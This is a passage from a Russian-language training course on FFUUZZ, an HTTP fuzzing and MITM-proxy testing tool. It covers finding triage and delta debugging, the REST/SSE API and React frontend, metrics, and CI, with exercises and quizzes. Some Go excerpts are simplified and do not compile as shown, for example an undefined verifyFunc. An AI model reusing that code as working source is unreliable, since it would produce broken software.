    for i := 0; i < runs; i++ {
        if stillTriggers(ctx, session, baseURL, detector, anomalyCfg, baseline, rep, timeout, logger) {
            reproduced++
        }
    }

    return reproduced >= (runs+1)/2, nil
}

// MinimizeSession — минимизирует сессию (удаляет лишние exchanges)
func (t *Triager) MinimizeSession(ctx context.Context, session model.RecordingSession,
    baseURL string, detector anomaly.Detector, anomalyCfg model.AnomalyConfig,
    baseline *anomaly.BaselineEntry, rep SessionReplayer, timeout time.Duration,
    logger zerolog.Logger) (*model.RecordingSession, error) {

    entries := session.Entries
    if len(entries) <= 1 {
        return &session, nil
    }

    // Пробуем удалить каждый exchange (с конца, пропускаем первый)
    for i := len(entries) - 1; i >= 1; i-- {
        candidate := make([]model.Exchange, 0, len(entries)-1)
        candidate = append(candidate, entries[:i]...)
        candidate = append(candidate, entries[i+1:]...)

        testSession := session
        testSession.Entries = candidate

        if stillTriggers(ctx, testSession, baseURL, detector, anomalyCfg, baseline, rep, timeout, logger) {
            entries = candidate  // Удаление не сломало аномалию
        }
    }

    result := session
    result.Entries = entries
    result.EntryCount = len(entries)
    return &result, nil
}

// MinimizeJSONBody — минимизирует JSON body через delta debugging
func (t *Triager) MinimizeJSONBody(ctx context.Context, session model.RecordingSession,
    exchangeIdx int, baseURL string, detector anomaly.Detector,
    anomalyCfg model.AnomalyConfig, baseline *anomaly.BaselineEntry,
    rep SessionReplayer, timeout time.Duration, logger zerolog.Logger) (*model.RecordingSession, error) {

    ex := session.Entries[exchangeIdx]
    raw, _ := base64.StdEncoding.DecodeString(ex.Request.BodyB64)

    var obj map[string]interface{}
    if err := json.Unmarshal(raw, &obj); err != nil {
        return nil, nil
    }

    // Delta debugging: бинарный поиск по ключам
    reduced := t.deltaDebugKeys(ctx, obj, sortedKeys(obj), verifyFunc, 0)

    data, _ := json.Marshal(reduced)
    result := cloneSessionWithBody(session, exchangeIdx,
        base64.StdEncoding.EncodeToString(data))
    return &result, nil
}

// deltaDebugKeys — рекурсивный бинарный поиск
func (t *Triager) deltaDebugKeys(ctx context.Context, obj map[string]interface{},
    keys []string, verify func(map[string]interface{}) bool, depth int) map[string]interface{} {

    if len(keys) == 0 {
        return obj
    }
    if len(keys) == 1 {
        candidate := withoutKeys(obj, keys)
        if verify(candidate) {
            return candidate
        }
        return obj
    }

    mid := len(keys) / 2
    left := keys[:mid]
    right := keys[mid:]

    // Пробуем правую половину
    if candidate := onlyKeys(obj, right); verify(candidate) {
        return t.deltaDebugKeys(ctx, candidate, right, verify, depth)
    }

    // Пробуем левую половину
    if candidate := onlyKeys(obj, left); verify(candidate) {
        return t.deltaDebugKeys(ctx, candidate, left, verify, depth)
    }

    // Рекурсивно пробуем каждую половину
    reduced := t.deltaDebugKeys(ctx, obj, left, verify, depth+1)
    reduced = t.deltaDebugKeys(ctx, reduced, right, verify, depth+1)
    return reduced
}
```

### Reproduce Worker: internal/engine/reproduce.go

```go
// ReproduceWorker — фоновый воркер для воспроизведения находок
type ReproduceWorker struct {
    findings    FindingStore
    artifacts   ArtifactStore
    artifactDir string
    logger      zerolog.Logger
}

func (w *ReproduceWorker) Run(ctx context.Context) {
    ticker := time.NewTicker(5 * time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-ctx.Done():
            return
        case <-ticker.C:
            w.processOne(ctx)
        }
    }
}

func (w *ReproduceWorker) processOne(ctx context.Context) {
    // 1. Захватываем задачу через SKIP LOCKED
    findingID, runs, ok, _ := w.findings.ClaimNextReproduceJob(ctx)
    if !ok {
        return
    }

    // 2. Загружаем артефакт
    artifact, _ := w.artifacts.GetByFindingID(ctx, findingID)
    data, _ := os.ReadFile(filepath.Join(w.artifactDir, artifact.FilePath))

    var payload model.ArtifactPayload
    json.Unmarshal(data, &payload)

    // 3. Воспроизводим N раз
    confirmed := 0
    for i := 0; i < runs; i++ {
        if w.reproduceOnce(ctx, payload) {
            confirmed++
        }
    }

    // 4. Обновляем статус
    if confirmed >= (runs+1)/2 {
        w.findings.SetReproduceStatus(ctx, findingID, string(model.ReproduceConfirmed), runs)
    } else {
        w.findings.SetReproduceStatus(ctx, findingID, string(model.ReproduceNotReproduced), runs)
    }
}
```

## Ключевые файлы для изучения

| Файл                                | Назначение                  |
| ----------------------------------- | --------------------------- |
| `internal/anomaly/detector.go`      | Детекторы аномалий          |
| `internal/triage/triage.go`         | Triage (confirm & minimize) |
| `internal/engine/reproduce.go`      | Reproduce worker            |
| `internal/triage/replayer_iface.go` | Интерфейс для triage        |

## Практические упражнения

### Упражнение 8.1: Сигнатуры

**Задача:** Вычислите сигнатуры для разных находок.

```go
func TestSignature(t *testing.T) {
    triager := triage.NewTriager()

    hit := anomaly.AnomalyHit{
        Type:     model.FindingTimeout,
        Method:   "POST",
        Endpoint: "/api/users/123",
        Exchange: model.Exchange{
            Request: model.RequestData{
                BodyB64: base64.StdEncoding.EncodeToString([]byte(`{"name":"test"}`)),
            },
        },
    }

    sig := triager.Signature(hit)
    t.Logf("Signature: %s", sig)
    // Ожидается: TIMEOUT|POST|/api/users/{_}|hash:...
}
```

### Упражнение 8.2: Delta Debugging

**Задача:** Проверьте алгоритм delta debugging на простом примере.

```go
func TestDeltaDebug(t *testing.T) {
    obj := map[string]interface{}{
        "name":  "test",
        "email": "test@example.com",
        "phone": "123456",
    }

    // verify возвращает true, если "name" присутствует
    verify := func(m map[string]interface{}) bool {
        _, ok := m["name"]
        return ok
    }

    triager := triage.NewTriager()
    result := triager.deltaDebugKeys(context.Background(), obj,
        sortedKeys(obj), verify, 0)

    // Ожидается: только {"name": "test"}
    if len(result) != 1 {
        t.Errorf("Expected 1 key, got %d", len(result))
    }
}
```

### Упражнение 8.3 (Challenge): Новый детектор

**Задача:** Реализуйте детектор для обнаружения больших ответов.

```go
type LargeResponseDetector struct {
    MaxSize int64
}

func (d *LargeResponseDetector) Detect(ex model.Exchange, result replayer.ExchangeResult,
    baseline *BaselineEntry, cfg model.AnomalyConfig) []AnomalyHit {
    // Реализация...
}
```

## Типичные ошибки и заблуждения

| Ошибка                            | Почему это проблема      | Как исправить               |
| --------------------------------- | ------------------------ | --------------------------- |
| Не нормализовать путь в сигнатуре | Дублирование находок     | Используйте `NormalizePath` |
| Confirm runs = 1                  | Ненадёжное подтверждение | Используйте ≥3 прогона      |
| Не проверять baseline для 5xx     | Ложные срабатывания      | Сравнивайте с baseline      |
| Глубокая рекурсия в delta debug   | Stack overflow           | Ограничьте depth            |

## Проверка знаний

1. **Вопрос:** Какой детектор всегда включён?
   - A) ServerErrorDetector
   - B) TimeoutDetector
   - C) LatencyDetector
   - D) RegexDetector

2. **Вопрос:** Что такое сигнатура находки?
   - A) UUID
   - B) TYPE|METHOD|path|hash
   - C) Timestamp
   - D) Campaign ID

3. **Вопрос:** Сколько прогонов нужно для подтверждения при runs=3?
   - A) 1
   - B) 2
   - C) 3
   - D) 0

4. **Вопрос (что будет, если...):** Что произойдёт, если удаление exchange не сломало аномалию?
   - A) Exchange остаётся
   - B) Exchange удаляется
   - C) Ошибка
   - D) Повторная попытка

5. **Вопрос:** Как часто reproduce worker проверяет новые задачи?
   - A) 1 секунда
   - B) 5 секунд
   - C) 10 секунд
   - D) 60 секунд

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-B

## Резюме и следующие шаги

В этом модуле мы:

- Изучили все типы детекторов аномалий
- Разобрали механизм дедупликации
- Освоили подтверждение и минимизацию находок
- Поняли работу reproduce worker

**Следующий модуль:** REST API и веб-интерфейс — изучим API endpoints и React-фронтенд.

---

# Модуль 9: REST API и веб-интерфейс

## Обзор

Этот модуль посвящён Control API и веб-интерфейсу FFUUZZ.

## Цели обучения

- Понять архитектуру Gin-сервера
- Изучить все API endpoints
- Разобраться в SSE-стриминге
- Освоить встраивание SPA через embed.FS
- Понять структуру React-фронтенда

## Основные концепции

### REST API Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                      GIN SERVER                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Middleware:                                                    │
│  ├── requestIDMiddleware  (X-Request-ID)                        │
│  ├── loggingMiddleware    (access logs)                         │
│  └── gin.Recovery         (panic recovery)                      │
│                                                                 │
│  Routes:                                                        │
│  ├── /healthz              GET  → health check                  │
│  ├── /metrics              GET  → Prometheus metrics            │
│  │                                                              │
│  └── /api/v1                                                    │
│      ├── /recordings                                            │
│      │   ├── GET           → list recordings                    │
│      │   ├── POST /import  → import sessions                    │
│      │   ├── GET /tree     → tree view                          │
│      │   ├── GET /export   → export sessions                    │
│      │   ├── GET /:id      → get recording                      │
│      │   └── DELETE /:id   → delete recording                   │
│      │                                                          │
│      ├── /campaigns                                             │
│      │   ├── GET           → list campaigns                     │
│      │   ├── POST          → create campaign                    │
│      │   ├── GET /:id      → get campaign                       │
│      │   ├── GET /:id/stats      → campaign stats               │
│      │   ├── GET /:id/findings   → campaign findings            │
│      │   ├── GET /:id/stream     → SSE stream                   │
│      │   ├── POST /:id/start     → start campaign               │
│      │   └── POST /:id/stop      → stop campaign                │
│      │                                                          │
│      └── /findings                                              │
│          ├── GET           → list findings                      │
│          ├── GET /:id      → get finding                        │
│          ├── GET /:id/artifact   → download artifact            │
│          └── POST /:id/reproduce → queue reproduce              │
│                                                                 │
│  └── /ui/*                 GET  → SPA (React)                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### SSE (Server-Sent Events)

```
Клиент                     Сервер
   │                         │
   │  GET /stream            │
   │  Accept: text/event-stream
   │────────────────────────▶│
   │                         │
   │◀──────────── data: {...}│ (каждые 2 секунды)
   │◀──────────── data: {...}│
   │◀──────────── data: {...}│
   │◀──────── event: done    │ (кампания завершена)
   │                         │
```

## Практический разбор кода

### Gin Server: internal/api/server.go

```go
// Server — Gin-based API server
type Server struct {
    router      *gin.Engine
    httpServer  *http.Server
    recordings  RecordingStore
    campaigns   CampaignStore
    findings    FindingStore
    artifacts   ArtifactStore
    engine      *engine.Engine
    health      HealthChecker
    artifactDir string
    webFS       fs.FS
    logger      zerolog.Logger
}

func NewServer(cfg ServerConfig) *Server {
    gin.SetMode(gin.ReleaseMode)
    router := gin.New()
    router.Use(gin.Recovery())

    s := &Server{...}

    // Middleware
    router.Use(s.requestIDMiddleware())
    router.Use(s.loggingMiddleware())

    // Health & metrics
    router.GET("/healthz", s.healthz)
    router.GET("/metrics", s.metricsHandler())

    // API v1
    v1 := router.Group("/api/v1")
    {
        // Recordings
        v1.POST("/recordings/import", s.importRecordings)
        v1.GET("/recordings/tree", s.getRecordingsTree)
        v1.GET("/recordings", s.listRecordings)
        v1.GET("/recordings/:id", s.getRecording)
        v1.DELETE("/recordings/:id", s.deleteRecording)

        // Campaigns
        v1.POST("/campaigns", s.createCampaign)
        v1.GET("/campaigns", s.listCampaigns)
        v1.GET("/campaigns/:id", s.getCampaign)
        v1.GET("/campaigns/:id/stats", s.getCampaignStats)
        v1.GET("/campaigns/:id/stream", s.streamCampaignStats)
        v1.POST("/campaigns/:id/start", s.startCampaign)
        v1.POST("/campaigns/:id/stop", s.stopCampaign)

        // Findings
        v1.GET("/findings", s.listFindings)
        v1.GET("/findings/:id", s.getFinding)
        v1.GET("/findings/:id/artifact", s.getFindingArtifact)
        v1.POST("/findings/:id/reproduce", s.reproduceFinding)
    }

    // SPA
    router.GET("/", func(c *gin.Context) {
        c.Redirect(http.StatusFound, "/ui/")
    })
    router.GET("/ui/*filepath", s.spaHandler)

    s.httpServer = &http.Server{
        Addr:              cfg.Addr,
        Handler:           router,
        ReadHeaderTimeout: 10 * time.Second,
    }

    return s
}
```

### SSE Handler: internal/api/sse.go

```go
func (s *Server) streamCampaignStats(c *gin.Context) {
    campaignID := c.Param("id")

    // SSE headers
    c.Header("Content-Type", "text/event-stream")
    c.Header("Cache-Control", "no-cache")
    c.Header("Connection", "keep-alive")
    c.Header("X-Accel-Buffering", "no")  // Отключаем буферизацию nginx

    // Flusher для немедленной отправки
    flusher, ok := c.Writer.(http.Flusher)
    if !ok {
        c.String(http.StatusInternalServerError, "streaming not supported")
        return
    }

    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-c.Request.Context().Done():
            return
        case <-ticker.C:
            stats, _ := s.buildCampaignStats(campaignID)

            data, _ := json.Marshal(stats)
            fmt.Fprintf(c.Writer, "data: %s\n\n", data)
            flusher.Flush()

            // Закрываем при терминальном статусе
            if isTerminalStatus(stats.Status) {
                fmt.Fprintf(c.Writer, "event: done\ndata: %s\n\n", data)
                flusher.Flush()
                return
            }
        }
    }
}
```

### SPA Handler: internal/api/spa.go

```go
func (s *Server) spaHandler(c *gin.Context) {
    path := c.Param("filepath")

    // Убираем ведущий /
    path = strings.TrimPrefix(path, "/")

    // Пробуем открыть файл
    file, err := s.webFS.Open(path)
    if err != nil {
        // Файл не найден — отдаём index.html (client-side routing)
        path = "index.html"
        file, _ = s.webFS.Open(path)
    }
    defer file.Close()

    // Определяем Content-Type
    contentType := mime.TypeByExtension(filepath.Ext(path))
    if contentType == "" {
        contentType = "application/octet-stream"
    }
    c.Header("Content-Type", contentType)

    // Кэширование для статики
    if strings.HasPrefix(path, "assets/") {
        c.Header("Cache-Control", "max-age=31536000, immutable")
    } else {
        c.Header("Cache-Control", "no-cache")
    }

    // Отдаём файл
    stat, _ := file.Stat()
    http.ServeContent(c.Writer, c.Request, path, stat.ModTime(), file)
}
```

### Embed FS: web/embed.go

```go
package web

import "embed"

//go:embed all:dist/*
var DistFS embed.FS
```

### React Frontend Structure

```
web/src/
├── api/                    # API клиенты
│   ├── client.ts          # Базовый HTTP клиент
│   ├── campaigns.ts       # Campaign API
│   ├── recordings.ts      # Recording API
│   ├── findings.ts        # Finding API
│   └── health.ts          # Health API
│
├── components/            # React компоненты
│   ├── Layout.tsx         # Основной layout
│   ├── EndpointTree.tsx   # Дерево endpoint
│   ├── ExchangeViewer.tsx # Просмотр exchange
│   ├── BodyViewer.tsx     # Просмотр тела
│   ├── JsonViewer.tsx     # JSON viewer
│   ├── FindingsTable.tsx  # Таблица находок
│   ├── StatsCard.tsx      # Карточка статистики
│   └── ...
│
├── pages/                 # Страницы
│   ├── DashboardPage.tsx
│   ├── CampaignsPage.tsx
│   ├── CampaignDetailPage.tsx
│   ├── CampaignCreatePage.tsx
│   ├── RecordingsPage.tsx
│   ├── FindingsPage.tsx
│   └── ...
│
├── hooks/                 # React hooks
│   ├── queries.ts         # TanStack Query hooks
│   └── useSSE.ts          # SSE hook
│
└── types/
    └── api.ts             # TypeScript типы
```

### React Query + SSE Hook

```typescript
// hooks/useSSE.ts
export function useCampaignSSE(campaignId: string) {
  const [stats, setStats] = useState<CampaignStats | null>(null);

  useEffect(() => {
    const eventSource = new EventSource(
      `/api/v1/campaigns/${campaignId}/stream`,
    );

    eventSource.onmessage = (event) => {
      const data = JSON.parse(event.data);
      setStats(data);
    };

    eventSource.addEventListener("done", () => {
      eventSource.close();
    });

    return () => eventSource.close();
  }, [campaignId]);

  return stats;
}

// hooks/queries.ts
export function useCampaigns() {
  return useQuery({
    queryKey: ["campaigns"],
    queryFn: () => campaignsApi.list(),
  });
}
```

## Ключевые файлы для изучения

| Файл                     | Назначение             |
| ------------------------ | ---------------------- |
| `internal/api/server.go` | Gin router, middleware |
| `internal/api/sse.go`    | SSE streaming          |
| `internal/api/spa.go`    | SPA serving            |
| `web/embed.go`           | Go embed для фронтенда |
| `web/src/api/*.ts`       | API клиенты            |
| `web/src/hooks/*.ts`     | React hooks            |

## Практические упражнения

### Упражнение 9.1: API тестирование

**Задача:** Протестируйте основные API endpoints.

```bash
# Health check
curl http://localhost:8081/healthz

# List recordings
curl http://localhost:8081/api/v1/recordings

# List campaigns
curl http://localhost:8081/api/v1/campaigns

# Campaign stats
curl http://localhost:8081/api/v1/campaigns/{id}/stats

# Metrics
curl http://localhost:8081/metrics
```

### Упражнение 9.2: SSE клиент

**Задача:** Напишите CLI-клиент для SSE.

```go
func main() {
    campaignID := os.Args[1]

    resp, _ := http.Get(
        fmt.Sprintf("http://localhost:8081/api/v1/campaigns/%s/stream", campaignID))
    defer resp.Body.Close()

    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        line := scanner.Text()
        if strings.HasPrefix(line, "data: ") {
            data := strings.TrimPrefix(line, "data: ")
            fmt.Println("Received:", data)
        }
        if strings.HasPrefix(line, "event: done") {
            fmt.Println("Campaign finished!")
            break
        }
    }
}
```

### Упражнение 9.3 (Challenge): Новый endpoint

**Задача:** Добавьте endpoint для bulk delete находок.

```go
// В internal/api/findings.go
func (s *Server) bulkDeleteFindings(c *gin.Context) {
    var req struct {
        IDs []string `json:"ids"`
    }
    if err := c.BindJSON(&req); err != nil {
        errorResponse(c, http.StatusBadRequest, "invalid_request", err.Error())
        return
    }

    // Реализация...
}
```

## Типичные ошибки и заблуждения

| Ошибка                       | Почему это проблема          | Как исправить                            |
| ---------------------------- | ---------------------------- | ---------------------------------------- |
| Не устанавливать SSE headers | Буферизация, задержки        | Установите `X-Accel-Buffering: no`       |
| Не использовать embed.FS     | Файлы не попадают в бинарник | Используйте `//go:embed`                 |
| Кэшировать index.html        | Client-side routing ломается | `Cache-Control: no-cache` для index.html |
| Не валидировать input        | Security issues              | Используйте `c.BindJSON` + валидация     |

## Проверка знаний

1. **Вопрос:** Какой header отключает буферизацию для SSE?
   - A) Cache-Control
   - B) X-Accel-Buffering
   - C) Connection
   - D) Content-Type

2. **Вопрос:** Как часто отправляются SSE-сообщения?
   - A) 1 секунда
   - B) 2 секунды
   - C) 5 секунд
   - D) 10 секунд

3. **Вопрос:** Что происходит при переходе к /ui/nonexistent?
   - A) 404
   - B) Отдаётся index.html
   - C) Редирект на /
   - D) Ошибка

4. **Вопрос (что будет, если...):** Что произойдёт, если assets не кэшировать?
   - A) Ничего
   - B) Лишний трафик
   - C) Ошибки
   - D) Медленная загрузка

5. **Вопрос:** Какой middleware добавляет X-Request-ID?
   - A) loggingMiddleware
   - B) requestIDMiddleware
   - C) recoveryMiddleware
   - D) corsMiddleware

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-B

## Резюме и следующие шаги

В этом модуле мы:

- Изучили архитектуру Gin-сервера
- Разобрали все API endpoints
- Освоили SSE-стриминг
- Поняли встраивание SPA
- Разобрали структуру React-фронтенда

**Следующий модуль:** Инфраструктура, метрики и CI/CD — изучим метрики, логирование и CI/CD pipeline.

---

# Модуль 10: Инфраструктура, метрики и CI/CD

## Обзор

Этот модуль посвящён инфраструктурным аспектам FFUUZZ: метрикам, логированию, сборке и CI/CD.

## Цели обучения

- Понять все Prometheus-метрики
- Изучить структурированное логирование с zerolog
- Разобраться в Makefile и сборке
- Освоить GitHub Actions workflow
- Понять Docker Compose конфигурацию

## Основные концепции

### Метрики Prometheus

```
┌─────────────────────────────────────────────────────────────────┐
│                      METRICS OVERVIEW                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Counter (только растут):                                       │
│  ├── ffuuzz_tests_total              Всего тестов               │
│  ├── ffuuzz_findings_total{type}     Находки по типу            │
│  ├── ffuuzz_cert_cache_hits_total    Попадания в кэш            │
│  ├── ffuuzz_cert_cache_misses_total  Промахи кэша               │
│  └── ffuuzz_connect_errors_total     Ошибки CONNECT             │
│                                                                 │
│  Gauge (меняются в обе стороны):                                │
│  └── ffuuzz_corpus_size              Размер корпуса             │
│                                                                 │
│  Histogram:                                                     │
│  └── ffuuzz_request_duration_seconds Время запросов             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Структурированное логирование

```json
{
  "level": "info",
  "time": "2026-04-01T12:00:00Z",
  "message": "campaign running",
  "campaign_id": "abc-123",
  "workers": 8,
  "seeds": 10,
  "max_tests": 10000
}
```

## Практический разбор кода

### Метрики: internal/metrics/metrics.go

```go
var (
    reg = prometheus.NewRegistry()

    TestsTotal = prometheus.NewCounter(prometheus.CounterOpts{
        Name: "ffuuzz_tests_total",
        Help: "Total number of fuzz tests executed.",
    })

    FindingsTotal = prometheus.NewCounterVec(prometheus.CounterOpts{
        Name: "ffuuzz_findings_total",
        Help: "Total number of findings by type.",
    }, []string{"type"})  // TIMEOUT, SERVER_ERROR, etc.

    RequestDuration = prometheus.NewHistogram(prometheus.HistogramOpts{
        Name:    "ffuuzz_request_duration_seconds",
        Help:    "Histogram of upstream request durations.",
        Buckets: prometheus.DefBuckets,
    })

    CorpusSize = prometheus.NewGauge(prometheus.GaugeOpts{
        Name: "ffuuzz_corpus_size",
        Help: "Current number of recording sessions.",
    })

    CertCacheHits = prometheus.NewCounter(prometheus.CounterOpts{
        Name: "ffuuzz_cert_cache_hits_total",
        Help: "Certificate cache hits.",
    })

    CertCacheMisses = prometheus.NewCounter(prometheus.CounterOpts{
        Name: "ffuuzz_cert_cache_misses_total",
        Help: "Certificate cache misses.",
    })
)

func init() {
    reg.MustRegister(TestsTotal, FindingsTotal, RequestDuration, CorpusSize, ...)
}

func Registry() *prometheus.Registry {
    return reg
}
```

### Логирование: internal/logging/logging.go

```go
func New(w io.Writer) zerolog.Logger {
    return zerolog.New(w).
        With().
        Timestamp().
        Logger()
}

// Контекстные логгеры
func WithRequestID(logger zerolog.Logger, requestID string) zerolog.Logger {
    return logger.With().Str("request_id", requestID).Logger()
}

func WithCampaignID(logger zerolog.Logger, campaignID string) zerolog.Logger {
    return logger.With().Str("campaign_id", campaignID).Logger()
}
```

### Makefile

```makefile
.PHONY: build-frontend build-backend build dev-frontend dev-backend clean lint test

build-frontend:
	cd web && npm ci && npm run build

build-backend:
	go build -o ffuuzz ./cmd/ffuuzz

build: build-frontend build-backend

dev-frontend:
	cd web && npm run dev

dev-backend:
	go run ./cmd/ffuuzz serve

clean:
	rm -rf web/dist/* ffuuzz
	@touch web/dist/.gitkeep

lint:
	cd web && npm run lint
	golangci-lint run

test:
	go test ./... -race
```

### Docker Compose

```yaml
version: "3.8"

services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: ffuuzz
      POSTGRES_PASSWORD: ffuuzz
      POSTGRES_DB: ffuuzz
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data

volumes:
  postgres_data:
```

### GitHub Actions

```yaml
# .github/workflows/tests.yml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: ffuuzz
          POSTGRES_PASSWORD: ffuuzz
          POSTGRES_DB: ffuuzz
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-go@v5
        with:
          go-version: "1.25"

      - name: Run tests
        env:
          FFUUZZ_DATABASE_URI: postgres://ffuuzz:ffuuzz@localhost:5432/ffuuzz?sslmode=disable
        run: go test ./... -race -v
```

## Ключевые файлы для изучения

| Файл                          | Назначение           |
| ----------------------------- | -------------------- |
| `internal/metrics/metrics.go` | Prometheus метрики   |
| `internal/logging/logging.go` | zerolog конфигурация |
| `Makefile`                    | Сборка и задачи      |
| `docker-compose.yml`          | PostgreSQL контейнер |
| `.github/workflows/*.yml`     | CI/CD                |

## Практические упражнения

### Упражнение 10.1: Метрики

**Задача:** Проверьте метрики в браузере.

```bash
# 1. Запустите FFUUZZ
./ffuuzz serve

# 2. Откройте в браузере
http://localhost:8081/metrics

# 3. Выполните несколько запросов через прокси

# 4. Обновите metrics — увидите изменения
```

### Упражнение 10.2: Сборка

**Задача:** Соберите проект полностью.

```bash
# Полная сборка
make build

# Только бэкенд
make build-backend

# Только фронтенд
make build-frontend

# Очистка
make clean

# Тесты
make test

# Линтинг
make lint
```

### Упражнение 10.3 (Challenge): Новая метрика

**Задача:** Добавьте метрику для отслеживания активных кампаний.

```go
// В internal/metrics/metrics.go
var ActiveCampaigns = prometheus.NewGauge(prometheus.GaugeOpts{
    Name: "ffuuzz_active_campaigns",
    Help: "Number of currently running campaigns.",
})

// В internal/engine/engine.go
func (e *Engine) StartCampaign(...) {
    // ...
    metrics.ActiveCampaigns.Inc()
}

func (e *Engine) runCampaign(...) {
    defer metrics.ActiveCampaigns.Dec()
    // ...
}
```

## Типичные ошибки и заблуждения

| Ошибка                        | Почему это проблема              | Как исправить                              |
| ----------------------------- | -------------------------------- | ------------------------------------------ |
| Использовать default registry | Конфликты с другими библиотеками | Создавайте свой `prometheus.NewRegistry()` |
| Не закрывать ticker           | Утечка горутин                   | Используйте `defer ticker.Stop()`          |
| Забывать `go mod tidy`        | Лишние зависимости               | Запускайте после изменений                 |
| Не использовать `-race`       | Пропуск race conditions          | Всегда тестируйте с `-race`                |

## Проверка знаний

1. **Вопрос:** Какой тип метрики — `ffuuzz_tests_total`?
   - A) Gauge
   - B) Counter
   - C) Histogram
   - D) Summary

2. **Вопрос:** Какая команда собирает фронтенд?
   - A) make build
   - B) make build-frontend
   - C) npm run build
   - D) go build

3. **Вопрос:** Какой порт использует PostgreSQL в docker-compose?
   - A) 3306
   - B) 5432
   - C) 6379
   - D) 8080

4. **Вопрос (что будет, если...):** Что произойдёт, если не вызвать `ticker.Stop()`?
   - A) Ничего
   - B) Утечка горутины
   - C) Паника
   - D) Остановка программы

5. **Вопрос:** Какой логгер используется в FFUUZZ?
   - A) logrus
   - B) zap
   - C) zerolog
   - D) stdlib log

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-C

## Резюме курса

Поздравляем! Вы прошли полный курс по FFUUZZ.

### Что мы изучили:

1. **Архитектура** — компоненты системы и их взаимодействие
2. **Доменная модель** — сущности и жизненные циклы
3. **MITM-прокси** — перехват HTTP/HTTPS
4. **Запись трафика** — нормализация и группировка
5. **Мутации** — pipeline и все типы мутаторов
6. **Движок** — оркестрация и worker pool
7. **Воспроизведение** — stateful replay и переменные
8. **Аномалии** — детекторы и triage
9. **API** — REST endpoints и SPA
10. **Инфраструктура** — метрики, логи, CI/CD

### Паттерны, которые мы освоили:

- Pipeline pattern (мутации)
- Worker pool pattern
- Token bucket rate limiting
- LRU cache
- Singleflight
- Delta debugging
- Trie (префиксное дерево)
- Graceful shutdown
- Interface segregation

---

# Приложение A: Глоссарий терминов

| Термин (EN)     | Перевод (RU)            | Описание                                                                  |
| --------------- | ----------------------- | ------------------------------------------------------------------------- |
| Fuzzing         | Фаззинг                 | Метод тестирования с использованием случайных/некорректных входных данных |
| Mutation        | Мутация                 | Изменение запроса для генерации новых тестов                              |
| Seed            | Сид                     | Исходный запрос/сессия для мутаций                                        |
| Corpus          | Корпус                  | Набор сидов для фаззинга                                                  |
| Campaign        | Кампания                | Конфигурация и процесс выполнения фаззинга                                |
| Finding         | Находка                 | Обнаруженная аномалия                                                     |
| Triage          | Триаж                   | Подтверждение и минимизация находок                                       |
| Baseline        | Базовая линия           | Ожидаемые метрики (latency, статус)                                       |
| MITM            | Man-in-the-Middle       | Атака/проксирование с перехватом трафика                                  |
| Replay          | Воспроизведение         | Повторная отправка запросов                                               |
| Anomaly         | Аномалия                | Отклонение от ожидаемого поведения                                        |
| Artifact        | Артефакт                | Файл с данными для воспроизведения                                        |
| Endpoint        | Эндпоинт                | Точка входа API (path)                                                    |
| Exchange        | Обмен                   | Пара запрос/ответ                                                         |
| Recording       | Запись                  | Сохранённая сессия обменов                                                |
| Worker          | Воркер                  | Горутина, выполняющая фаззинг                                             |
| Intensity       | Интенсивность           | Вероятность применения мутации (0.0-1.0)                                  |
| Dedup           | Дедупликация            | Удаление дубликатов                                                       |
| Signature       | Сигнатура               | Уникальный ключ для дедупликации                                          |
| Confirm         | Подтверждение           | Повторная проверка находки                                                |
| Minimize        | Минимизация             | Сокращение до минимального воспроизводящего набора                        |
| Delta Debugging | Дельта-отладка          | Алгоритм бинарного поиска для минимизации                                 |
| Rate Limiting   | Ограничение скорости    | Контроль RPS                                                              |
| Token Bucket    | Ведро токенов           | Алгоритм rate limiting                                                    |
| LRU             | Least Recently Used     | Алгоритм вытеснения кэша                                                  |
| Singleflight    | Синглфлайт              | Предотвращение дублирования запросов                                      |
| Trie            | Префиксное дерево       | Структура для хранения строк                                              |
| SSE             | Server-Sent Events      | Потоковая передача от сервера                                             |
| SPA             | Single Page Application | Одностраничное приложение                                                 |
| Embed           | Встраивание             | Включение файлов в бинарник                                               |

---

# Приложение B: Шпаргалка

## Команды CLI

```bash
# Полный запуск
./ffuuzz serve -a :8081 -p :8080 -d postgres://...

# Только прокси (dev)
./ffuuzz proxy -output traffic.jsonl

# Анализ записи
./ffuuzz record < traffic.jsonl
```

## API Endpoints

```bash
# Health
curl http://localhost:8081/healthz

# Import
curl -X POST http://localhost:8081/api/v1/recordings/import \
  -H "Content-Type: application/json" \
  -d @sessions.json

# Create campaign
curl -X POST http://localhost:8081/api/v1/campaigns \
  -H "Content-Type: application/json" \
  -d '{"name":"test","recording_ids":["..."],"config":{...}}'

# Start campaign
curl -X POST http://localhost:8081/api/v1/campaigns/{id}/start

# Stop campaign
curl -X POST http://localhost:8081/api/v1/campaigns/{id}/stop

# SSE stream
curl http://localhost:8081/api/v1/campaigns/{id}/stream

# Metrics
curl http://localhost:8081/metrics
```

## Конфигурация

```bash
# Env vars
export FFUUZZ_API_ADDRESS=":8081"
export FFUUZZ_PROXY_ADDRESS=":8080"
export FFUUZZ_DATABASE_URI="postgres://..."
export FFUUZZ_WORKERS=8
export FFUUZZ_RPS=50

# Flags
./ffuuzz serve -a :8081 -p :8080 -d postgres://... --cert-memory-only
```

## Makefile

```bash
make build          # Полная сборка
make build-backend  # Только Go
make build-frontend # Только React
make dev-backend    # Запуск dev-сервера Go
make dev-frontend   # Запуск Vite dev server
make test           # Запуск тестов
make lint           # Линтинг
make clean          # Очистка
```

---
